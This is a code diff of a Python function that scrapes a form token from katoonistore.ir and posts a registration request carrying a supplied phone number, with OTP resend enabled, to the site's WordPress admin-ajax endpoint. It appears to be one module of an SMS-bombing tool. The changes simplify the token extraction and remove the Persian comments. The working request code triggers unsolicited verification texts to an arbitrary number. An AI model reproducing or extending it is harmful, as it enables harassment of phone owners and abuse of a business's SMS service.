@@ -58,29 +58,23 @@ def katoonistore(phone):
         session = requests.Session()
         home_response = session.get("https://katoonistore.ir/", timeout=10)
         
-        # استخراج instance_id از صفحه
+        # استخراج instance_id
         instance_id = None
-        instance_patterns = [
-            r'name="instance_id" value="([a-f0-9]+)"',
-            r'instance_id["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
-        ]
-        
-        for pattern in instance_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                instance_id = match.group(1)
-                break
+        instance_pattern = r'name="instance_id" value="([a-f0-9]+)"'
+        match = re.search(instance_pattern, home_response.text)
+        if match:
+            instance_id = match.group(1)
         
         if not instance_id:
-            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"  # مقدار پیشفرض
+            instance_id = "0ccd1ebf590232d8b06f9157a9654fa1"
         
         url = "https://katoonistore.ir/wp-admin/admin-ajax.php"
         
         payload = {
-            "digits_reg_name": "م",  # نام تصادفی
+            "digits_reg_name": "م",
             "digt_countrycode": "+98",
             "phone": digits_phone,
-            "digits_reg_تاریخ1747725841572": "",  # فیلدهای اضافی
+            "digits_reg_تاریخ1747725841572": "",
             "jalali_digits_reg_تاریخ1747725841572463063470": "",
             "digits_process_register": "1",
             "sms_otp": "",
@@ -93,7 +87,7 @@ def katoonistore(phone):
             "dig_otp": "sms_otp",
             "digits": "1",
             "digits_redirect_page": "//katoonistore.ir/?page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
-            "digits_form": "d3232db853",  # ممکنه نیاز به استخراج داشته باشه
+            "digits_form": "d3232db853",
             "_wp_http_referer": "/?login=true&page=1&redirect_to=https%3A%2F%2Fkatoonistore.ir%2F",
             "otp_resend": "true",
             "container": "digits_protected",
@@ -122,6 +116,9 @@ def katoonistore(phone):
     except Exception:
         print(f'{r}[-] (katoonistore) Failed{a}')
         return False
+
+
+
 
 
 
